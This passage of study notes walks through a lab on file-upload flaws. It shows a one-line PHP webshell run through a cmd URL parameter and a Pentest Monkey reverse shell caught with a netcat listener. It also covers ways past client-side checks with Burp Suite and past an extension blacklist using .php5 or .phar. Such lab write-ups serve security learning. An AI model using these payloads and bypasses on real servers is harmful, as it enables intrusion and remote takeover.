be the way to **Remote Code Execution(RCE)**

vulns:
* Overwriting existing files
* Upadloing & executing shells
* Bypassing Client-Side filtering
* Bypassing Server-Side filtering
* Fooling content type validation checks

## Methodology
**enumeration is key**

looking source code to find client-side filtering vuln
scanning with a directory bruteforcer : `sudo apt install gobuster`


## Overwriting Existing Files
when files are uploaded to server, server should ensure the file will not overwrite anything which alreading exists on server.

Common practice:
* Assign file with a new name or random name

### if we don't have overwriting check
we found the website display the image with `images/spaniel.jpg`
![](https://i.imgur.com/9FNtNHG.png)

if we have website like this, we can upload our `spaniel.jpg` to overwriting existing file as attack
![](https://i.imgur.com/89xgC1m.png)

## Remote Code Execution
RCE tends to be uploading a program with same language as back-end like PHP.

basic way:
* webshells
* reverse shells

A fully featured reverse shell is our ideal goal for an attacker.
But webshell may be the only option available.

### Web shells
if we have a website like this
![](https://i.imgur.com/aM0IIQc.png)

we can start with gobuster scan
![](https://i.imgur.com/UEmOcxL.png)

we can found our uploads might go go `/uploads`
and after we uploaded something, we can go to `http://demo.uploadvulns.thm/uploads` to check the result\

![](https://i.imgur.com/cRDq9DL.png)

a simple webshell in PHP:
```php
<?php
    echo system($_GET["cmd"]);
?>
```

and we can use URL parameter to execute some command like this:
`http://demo.uploadvulns.thm/uploads/webshell.php?cmd=id;whoami;ls`
it would execute 
```bash
$ id
$ whoami
$ ls
```

### Reverse Shells
using ubiquitous *Pentest Monkey reverse shell* here

we can get the php payload [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
)

remember to change the ip in `php-reverse-shell.php`
![](https://i.imgur.com/cxGA4Bd.png)


and we start our Netcat listener:
```bash
$ nc -lvnp 1234
```

we upload the reverse shell file and we can navigating to `http://demo.uploadvulns.thm/uploads/shell.php`, starting the shell

finally we get a fully shells in our netcat
![](https://i.imgur.com/vZoBDtm.png)



## Filtering

* client-side filtering would run in our browser.
* Filtering occurs before the file uploaded to the server
* javascript is ubiquitous client-side scripting language.

Filtering kinds:
* Extension Validation : identify the contents of a file
	* Blacklist Extension
	* Whitelist Extension
* File Type Filtering
	* **Multipurpose Internet Mail Extension**(MIME) **validation** : transfer attach over email or HTTP(S)
	* **Magic number validation**
* File Name filtering
* File Length filtering out null byte
* Flie Content filtering

### Client-side
* Turn off javascript in browser
* Intercept & modify incoming page : using Burpsuite before the web page is loaded
* Intercept & modify file upload
* Send the file directly to the upload point : using `curl` to send the POST

remember to use GOBUSTER!


exmaple of whitelist code :
![](https://i.imgur.com/XRDetca.png)

by default BurpSuite would not intercept external js files
remove the `^js$|` in first line in options:
![](https://i.imgur.com/su3Ugwp.png)


reload homepage & Intercept the **response to this request** & forward:
![](https://i.imgur.com/yZDbm47.png)

if the functions are not inline:
Forward to the right script & Intercept the** Response to this request**
![](https://i.imgur.com/siOxfsG.png)

### Server-side
a example of php code to filter out
```php
<?php
    //Get the extension
    $extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];
    //Check the extension against the blacklist -- .php and .phtml
    switch($extension){
        case "php":
        case "phtml":
        case NULL:
            $uploadFail = True;
            break;
        default:
            $uploadFail = False;
    }
?>
```

* this code search for the last period `.`
* block out `.php` `.phtml`
* most of them only block this 2 extensions, but we can use `.php5` `.phar`
* especially for the system that didn't update the filter configuration